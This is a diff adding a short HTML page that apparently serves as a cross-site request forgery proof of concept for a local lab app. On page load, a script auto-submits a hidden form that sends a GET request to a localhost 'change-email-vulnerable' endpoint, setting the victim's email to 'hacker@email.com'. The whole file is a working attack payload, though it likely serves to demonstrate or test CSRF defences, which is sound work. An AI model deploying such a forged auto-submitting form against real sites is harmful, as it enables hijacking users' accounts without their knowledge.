@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<form id="attackForm" action="http://127.0.0.1:8000/change-email-vulnerable/" method="GET">
+    <input type="hidden" name="new_email" value="hacker@email.com">
+</form>
+
+<script>
+document.getElementById("attackForm").submit();
+</script>
+
+</body>
+</html>
